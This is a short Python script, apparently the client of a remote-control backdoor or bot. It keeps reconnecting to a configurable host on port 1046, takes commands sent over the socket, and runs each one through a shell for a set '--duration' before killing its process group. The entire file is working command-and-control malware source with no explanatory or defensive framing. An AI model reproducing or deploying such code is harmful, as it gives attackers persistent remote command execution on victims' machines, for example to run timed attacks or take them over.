import socket
import os
import subprocess
import time
import signal

target_host = ""
target_port = 1046

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host, target_port))
        print(f"[*] Connected to {target_host}:{target_port}")
        
        while True:
            data = client.recv(1024)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                # Split the command and duration
                command_parts = data.decode("utf-8").split("--duration")
                command = command_parts[0].strip()  # Extract the command
                duration = int(command_parts[1]) if len(command_parts) > 1 else 0  # Extract the duration (if available)

                # run command for specified duration
                cmd = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 
                time.sleep(duration)
                os.killpg(os.getpgid(cmd.pid), signal.SIGTERM)
                break
        client.close()

    except Exception as e:
        print(f"[-] Connection error: {e}")
        print("[*] Retrying in 5 seconds...")
        time.sleep(5)  # Wait for 5 seconds before retrying
